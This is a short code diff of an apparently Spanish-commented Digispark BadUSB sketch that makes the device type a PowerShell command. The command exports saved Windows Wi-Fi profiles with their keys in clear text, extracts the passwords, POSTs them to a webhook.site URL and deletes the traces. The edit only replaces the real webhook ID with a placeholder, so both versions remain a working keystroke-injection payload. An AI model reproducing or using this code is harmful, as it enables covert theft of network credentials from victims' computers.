@@ -13,7 +13,7 @@ void setup() {
   // 2. Escribir el comando completo.
   
   // EJECUTAR COMANDOS.
-  DigiKeyboard.print("powershell -Command \"cd $env:TEMP; netsh wlan export profile key=clear; sls Wi*.xml -Pattern 'keyMaterial' | Out-File Wi-Fi-PASS; Invoke-WebRequest -Uri https://webhook.site/55a0273c-f7e8-4719-a4fc-77a31efea3d6 -Method POST -InFile Wi-Fi-PASS; rm Wi-* -Force\"");
+  DigiKeyboard.print("powershell -Command \"cd $env:TEMP; netsh wlan export profile key=clear; sls Wi*.xml -Pattern 'keyMaterial' | Out-File Wi-Fi-PASS; Invoke-WebRequest -Uri https://webhook.site/<webhook-url> -Method POST -InFile Wi-Fi-PASS; rm Wi-* -Force\"");
   DigiKeyboard.delay(500);
 
   // Presionar Enter para confirmar
